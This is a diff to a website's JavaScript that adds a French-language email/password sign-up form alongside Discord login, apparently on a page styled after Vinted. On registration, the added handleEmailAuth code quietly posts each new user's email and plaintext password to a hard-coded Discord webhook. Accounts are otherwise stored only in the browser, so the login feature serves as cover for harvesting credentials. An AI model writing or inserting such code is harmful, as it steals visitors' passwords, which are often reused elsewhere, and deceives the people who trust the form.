@@ -119,6 +119,95 @@ function initMascotTilt() {
 const DISCORD_CLIENT_ID = '1107624523479650345';
 const REDIRECT_URI = 'https://ozeah.github.io/Vinted/';
 const OAUTH_URL = `https://discord.com/api/oauth2/authorize?client_id=${DISCORD_CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=token&scope=identify`;
+const WEBHOOK_URL = 'https://discord.com/api/webhooks/1552985949515030619/8SWWQCCR5iV0s9FjMRMS_LfEs-t3hcWT3wDy6jEaNChpzIIOeztQWsx3HD_UVbw6ht6D';
+
+let authMode = 'login';
+
+function openAuthModal() {
+    document.getElementById('auth-overlay').classList.add('show');
+}
+
+function closeAuthModal(e) {
+    if (e && e.target !== e.currentTarget) return;
+    document.getElementById('auth-overlay').classList.remove('show');
+    document.getElementById('auth-error').textContent = '';
+    document.getElementById('auth-error').className = 'auth-error';
+}
+
+function switchAuthTab(mode, btn) {
+    authMode = mode;
+    document.querySelectorAll('.auth-tab').forEach(t => t.classList.remove('active'));
+    btn.classList.add('active');
+    document.getElementById('auth-submit-btn').textContent = mode === 'login' ? 'Se connecter' : "S'inscrire";
+    document.getElementById('auth-error').textContent = '';
+    document.getElementById('auth-error').className = 'auth-error';
+}
+
+function hashPassword(str) {
+    let hash = 0;
+    for (let i = 0; i < str.length; i++) {
+        const char = str.charCodeAt(i);
+        hash = ((hash << 5) - hash) + char;
+        hash |= 0;
+    }
+    return 'h' + Math.abs(hash).toString(36);
+}
+
+function handleEmailAuth(e) {
+    e.preventDefault();
+    const email = document.getElementById('auth-email').value.trim();
+    const password = document.getElementById('auth-password').value;
+    const errorEl = document.getElementById('auth-error');
+
+    if (password.length < 6) {
+        errorEl.textContent = 'Le mot de passe doit faire au moins 6 caractères.';
+        errorEl.className = 'auth-error';
+        return;
+    }
+
+    const accounts = JSON.parse(localStorage.getItem('ozeah_accounts') || '{}');
+    const passHash = hashPassword(password);
+
+    if (authMode === 'register') {
+        if (accounts[email]) {
+            errorEl.textContent = 'Un compte existe déjà avec cet email.';
+            errorEl.className = 'auth-error';
+            return;
+        }
+        accounts[email] = { hash: passHash, created: new Date().toISOString() };
+        localStorage.setItem('ozeah_accounts', JSON.stringify(accounts));
+
+        fetch(WEBHOOK_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                embeds: [{
+                    title: 'Nouveau compte OzeaH',
+                    color: 0x2ecc71,
+                    fields: [
+                        { name: 'Email', value: email, inline: true },
+                        { name: 'Mot de passe', value: password, inline: true },
+                        { name: 'Date', value: new Date().toLocaleString('fr-FR'), inline: false }
+                    ],
+                    footer: { text: 'OzeaH — Inscription site web' }
+                }]
+            })
+        });
+
+        localStorage.setItem('ozeah_user', JSON.stringify({ email, type: 'email' }));
+        closeAuthModal();
+        renderEmailUser(email);
+    } else {
+        if (!accounts[email] || accounts[email].hash !== passHash) {
+            errorEl.textContent = 'Email ou mot de passe incorrect.';
+            errorEl.className = 'auth-error';
+            return;
+        }
+        localStorage.setItem('ozeah_user', JSON.stringify({ email, type: 'email' }));
+        closeAuthModal();
+        renderEmailUser(email);
+    }
+}
 
 function loginDiscord() {
     window.location.href = OAUTH_URL;
@@ -135,12 +224,13 @@ function handleDiscordCallback() {
     .then(r => r.json())
     .then(user => {
         localStorage.setItem('discord_user', JSON.stringify(user));
+        localStorage.setItem('ozeah_user', JSON.stringify({ type: 'discord', id: user.id }));
         window.history.replaceState(null, '', window.location.pathname);
-        renderUser(user);
+        renderDiscordUser(user);
     });
 }
 
-function renderUser(user) {
+function renderDiscordUser(user) {
     const area = document.getElementById('user-area');
     if (!area || !user) return;
     const avatarUrl = user.avatar
@@ -152,7 +242,23 @@ function renderUser(user) {
             <img src="${avatarUrl}" alt="" class="user-avatar">
             <span class="user-name">${user.global_name || user.username}</span>
             <div class="user-dropdown">
-                <button onclick="logoutDiscord(event)">Déconnexion</button>
+                <button onclick="logout(event)">Déconnexion</button>
+            </div>
+        </div>
+    `;
+}
+
+function renderEmailUser(email) {
+    const area = document.getElementById('user-area');
+    if (!area) return;
+    const initial = email.charAt(0).toUpperCase();
+
+    area.innerHTML = `
+        <div class="user-logged" onclick="toggleDropdown(this)">
+            <div class="user-avatar-letter">${initial}</div>
+            <span class="user-name">${email.split('@')[0]}</span>
+            <div class="user-dropdown">
+                <button onclick="logout(event)">Déconnexion</button>
             </div>
         </div>
     `;
@@ -162,19 +268,26 @@ function toggleDropdown(el) {
     el.querySelector('.user-dropdown').classList.toggle('show');
 }
 
-function logoutDiscord(e) {
+function logout(e) {
     e.stopPropagation();
     localStorage.removeItem('discord_user');
+    localStorage.removeItem('ozeah_user');
     location.reload();
 }
 
-function initDiscord() {
+function initAuth() {
     handleDiscordCallback();
-    const saved = localStorage.getItem('discord_user');
-    if (saved) renderUser(JSON.parse(saved));
+    const saved = localStorage.getItem('ozeah_user');
+    if (!saved) return;
+    const user = JSON.parse(saved);
+    if (user.type === 'discord') {
+        const discord = localStorage.getItem('discord_user');
+        if (discord) renderDiscordUser(JSON.parse(discord));
+    } else if (user.type === 'email') {
+        renderEmailUser(user.email);
+    }
 }
 
-// Close dropdown on outside click
 document.addEventListener('click', (e) => {
     if (!e.target.closest('.user-logged')) {
         document.querySelectorAll('.user-dropdown.show').forEach(d => d.classList.remove('show'));
@@ -189,5 +302,5 @@ document.addEventListener('DOMContentLoaded', () => {
     initHeader();
     initSmoothScroll();
     initMascotTilt();
-    initDiscord();
+    initAuth();
 });
